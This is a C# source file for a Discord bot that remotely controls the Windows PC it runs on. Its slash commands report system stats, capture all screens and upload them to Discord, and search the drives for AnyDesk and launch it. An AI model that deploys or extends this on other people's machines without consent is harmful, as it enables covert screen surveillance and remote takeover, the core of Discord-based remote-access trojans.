using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using DSharpPlus;
using DSharpPlus.CommandsNext;
using DSharpPlus.CommandsNext.Attributes;
using DSharpPlus.Entities;
using DSharpPlus.SlashCommands;
using Microsoft.Extensions.DependencyInjection;
using static DiscordScreenshotApp.ScreenshotCommandModule;
using IronOcr;


namespace DiscordScreenshotApp
{
    public partial class MainForm : Form
    {
        private DiscordClient _discord;
        private CommandsNextExtension _commands;
        private SlashCommandsExtension _slashCommands;


        public MainForm()
        {
            InitializeComponent();


            _discord = new DiscordClient(new DiscordConfiguration
            {
                Token = "BOT_TOKEN", // Put here your bot token
                TokenType = TokenType.Bot,
                Intents = DiscordIntents.All,
                MinimumLogLevel = Microsoft.Extensions.Logging.LogLevel.Debug
            });

            _commands = _discord.UseCommandsNext(new CommandsNextConfiguration
            {
                StringPrefixes = new[] { "/" }
            });

            _slashCommands = _discord.UseSlashCommands(new SlashCommandsConfiguration
            {
                Services = new ServiceCollection()
                    .AddSingleton<Random>()
                    .BuildServiceProvider()
            });

            // Register the "/ping" slash command

            _slashCommands.RegisterCommands<PingCommandModule>();
            // Register the "/info" command
            _slashCommands.RegisterCommands<InfoCommandModule>();
            // Register the "/screenshot" command
            _slashCommands.RegisterCommands<ScreenshotCommandModule>();
            // Register the "/rdp" command
            _slashCommands.RegisterCommands<RdpCommandModule>();
            // Register the "/help" command
            _slashCommands.RegisterCommands<HelpCommandModule>();






            // Connect the bot to Discord
            ConnectBotAsync().ConfigureAwait(false);
        }

        private async Task ConnectBotAsync()
        {
            await _discord.ConnectAsync();
            await Task.Delay(-1); // Keep the bot running indefinitely
        }

        private void CloseButton_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private bool mouseDown;
        private Point lastLocation;

        private void MainForm_MouseDown(object sender, MouseEventArgs e)
        {
            mouseDown = true;
            lastLocation = e.Location;
        }

        private void MainForm_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseDown)
            {
                this.Location = new Point(
                    (this.Location.X - lastLocation.X) + e.X, (this.Location.Y - lastLocation.Y) + e.Y);

                this.Update();
            }
        }

        private void MainForm_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }
    }

    public class PingCommandModule : ApplicationCommandModule
    {
        [SlashCommand("ping", "Tracks the latency and replies with an embedded message.")]
        public async Task Ping(InteractionContext ctx)
        {
            // Record the timestamp before sending the initial message
            var startTime = DateTime.Now;

            // Respond to the user's command with an embedded message
            var initialResponse = new DiscordInteractionResponseBuilder()
                .AddEmbed(new DiscordEmbedBuilder
                {
                    Title = "Pinging...",
                    Description = "Tracking latency...",
                    Color = new DiscordColor(0xffffff) 
                });

            await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource, initialResponse);

            // Calculate the difference in milliseconds between the initial message and the response
            var latency = (DateTime.Now - startTime).TotalMilliseconds;

            // Reply to the user's message with an embedded message containing the latency
            var embed = new DiscordEmbedBuilder
            {
                Title = "Ping Result",
                Description = $"Latency: {latency} ms",
                Color = new DiscordColor(0xffffff)
            };

            await ctx.EditResponseAsync(new DiscordWebhookBuilder()
                .AddEmbed(embed));
        }
    }

    public class InfoCommandModule : ApplicationCommandModule
    {
        [SlashCommand("info", "Displays the name of the PC where the program is running")]
        public async Task Info(InteractionContext ctx)
        {
            var pcName = Environment.MachineName;
            var cpuUsage = GetCpuUsage();
            var ramUsage = GetUsedRam();
            var uptime = GetSystemUptime();

            var embed = new DiscordEmbedBuilder
            {
                Title = "PC INFO",
                Description = $":computer: | PC: {pcName}\n" +
                              $":gear: | CPU Usage: {cpuUsage}%\n" +
                              $":floppy_disk: | RAM Usage: {ramUsage} MB\n" +
                              $":clock1: | UPTIME: {uptime}\n",
                Color = new DiscordColor(0x00ff00) 
            };

            await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource, new DiscordInteractionResponseBuilder()
                .AddEmbed(embed));
        }


        private string GetSystemUptime()
        {
            using (var uptimeCounter = new PerformanceCounter("System", "System Up Time"))
            {
                uptimeCounter.NextValue();
                var uptimeSeconds = uptimeCounter.NextValue();
                var uptimeTimeSpan = TimeSpan.FromSeconds(uptimeSeconds);
                return FormatUptime(uptimeTimeSpan);
            }
        }

        private string FormatUptime(TimeSpan uptime)
        {
            return $"{uptime.Days} days, {uptime.Hours} hours, {uptime.Minutes} minutes, {uptime.Seconds} seconds";
        }

        private float GetCpuUsage()
        {
            using (var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total"))
            {
                cpuCounter.NextValue();
                System.Threading.Thread.Sleep(500);
                return (int)cpuCounter.NextValue();
            }
        }

        private float GetUsedRam()
        {
            using (var ramCounter = new PerformanceCounter("Memory", "Available MBytes"))
            {
                float totalMemory = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory / (1024f * 1024f); // Total RAM in MB
                float unusedMemory = ramCounter.NextValue(); // Unused RAM in MB
                float usedMemory = totalMemory - unusedMemory; // Used RAM in MB
                return (int)usedMemory;

            }
        }




    }




    public class ScreenshotCommandModule : ApplicationCommandModule
    {
        [SlashCommand("screenshot", "Takes a screenshot of all screens")]
        public async Task Screenshot(InteractionContext ctx)
        {
            var pcName = Environment.MachineName;

            var embed = new DiscordEmbedBuilder
            {
                Title = "Screenshot",
                Description = $"Screenshot of all screens from PC: {pcName}",
                Color = new DiscordColor(0x00ff00) 
            };

            // Capture all screens and convert to byte array
            var screenshot = CaptureScreens();
            var byteArray = ImageToByteArray(screenshot);

            // Send the initial response with the embed
            await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource, new DiscordInteractionResponseBuilder().AddEmbed(embed));

            // Send the screenshot as an attachment in a regular message
            await ctx.FollowUpAsync(new DiscordFollowupMessageBuilder().AddFile("screenshot.png", new MemoryStream(byteArray)).AddEmbed(embed));
        }

        private Bitmap CaptureScreens()
        {
            var allScreens = Screen.AllScreens;
            var totalWidth = 0;
            var maxHeight = 0;

            // Calculate the total width and maximum height
            foreach (var screen in allScreens)
            {
                totalWidth += screen.Bounds.Width;
                if (screen.Bounds.Height > maxHeight)
                    maxHeight = screen.Bounds.Height;
            }

            // Create a new bitmap to hold the combined screenshot
            var screenshot = new Bitmap(totalWidth, maxHeight, System.Drawing.Imaging.PixelFormat.Format32bppArgb);

            // Capture each screen and paste it onto the combined bitmap
            using (var graphics = Graphics.FromImage(screenshot))
            {
                var xPosition = 0;
                foreach (var screen in allScreens)
                {
                    graphics.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, xPosition, 0, screen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    xPosition += screen.Bounds.Width;
                }
            }

            return screenshot;
        }

        private byte[] ImageToByteArray(Image image)
        {
            using (var ms = new MemoryStream())
            {
                image.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                return ms.ToArray();
            }
        }

        public class RdpCommandModule : ApplicationCommandModule
        {
            private const string AnyDeskFileName = "AnyDesk.exe";

            [SlashCommand("rdp", "Opens the AnyDesk application")]
            public async Task Rdp(InteractionContext ctx)
            {
                string anyDeskPath = FindAnyDeskExecutable();

                if (!string.IsNullOrEmpty(anyDeskPath))
                {
                    try
                    {
                        Process.Start(anyDeskPath);

                        await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource,
                            new DiscordInteractionResponseBuilder()
                            .WithContent("AnyDesk application is launched."));
                    }
                    catch (Exception ex)
                    {
                        await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource,
                            new DiscordInteractionResponseBuilder()
                            .WithContent($"Failed to open AnyDesk: {ex.Message}"));
                    }
                }
                else
                {
                    await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource,
                        new DiscordInteractionResponseBuilder()
                        .WithContent("AnyDesk executable not found."));
                }
            }

            private string FindAnyDeskExecutable()
            {
                DriveInfo[] drives = DriveInfo.GetDrives();

                foreach (DriveInfo drive in drives)
                {
                    string anyDeskPath = SearchForAnyDeskInDrive(drive.RootDirectory.FullName);
                    if (!string.IsNullOrEmpty(anyDeskPath))
                        return anyDeskPath;
                }

                return null;
            }

            private string SearchForAnyDeskInDrive(string directory)
            {
                Queue<string> directoriesToSearch = new Queue<string>();
                directoriesToSearch.Enqueue(directory);

                while (directoriesToSearch.Count > 0)
                {
                    string currentDir = directoriesToSearch.Dequeue();

                    try
                    {
                        string[] files = Directory.GetFiles(currentDir, AnyDeskFileName);

                        if (files.Length > 0)
                            return files[0];

                        string[] subDirectories = Directory.GetDirectories(currentDir);
                        foreach (string subDir in subDirectories)
                        {
                            directoriesToSearch.Enqueue(subDir);
                        }
                    }
                    catch (Exception)
                    {
                        // Ignore any exceptions and continue the search
                    }
                }

                return null;
            }
        }

        public class HelpCommandModule : ApplicationCommandModule
        {
            [SlashCommand("help", "Provides information about available commands.")]
            public async Task Help(InteractionContext ctx)
            {
                var embed = new DiscordEmbedBuilder
                {
                    Title = "Help",
                    Description = "Here's a list of available commands and their descriptions:",
                    Color = new DiscordColor(0x6E97DE) 
                };

                embed.AddField("/ping", "Tracks the ms between the program and the PC.");
                embed.AddField("/info", "Displays the name of the PC where the program is running, CPU Usage, RAM Usage, and Uptime.");
                embed.AddField("/screenshot", "Takes a screenshot of all screens from the PC.");
                embed.AddField("/rdp", "Opens the AnyDesk application.");

                await ctx.CreateResponseAsync(InteractionResponseType.ChannelMessageWithSource, new DiscordInteractionResponseBuilder().AddEmbed(embed));
            }
        }

    }
}